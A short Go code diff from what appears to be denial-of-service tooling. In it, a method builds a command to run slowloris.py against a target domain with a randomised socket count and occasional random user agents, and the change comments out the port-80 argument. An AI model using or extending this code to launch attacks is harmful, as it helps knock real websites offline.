@@ -25,7 +25,7 @@ func (slowloris Slowloris) BuildAtkCommand() []string {
 	rand.Seed(time.Now().UnixNano())
 	slowloris.parts = []string{"python3", "slowloris.py"}
 	slowloris.parts = append(slowloris.parts, "--sockets", fmt.Sprint(rand.Intn(100)+150), slowloris.targetDomain)
-	slowloris.parts = append(slowloris.parts, "-p 80")
+	//slowloris.parts = append(slowloris.parts, "-p 80")
 	if rand.Float32() < 0.33 {
 		slowloris.parts = append(slowloris.parts, "--randuseragents")
 	}
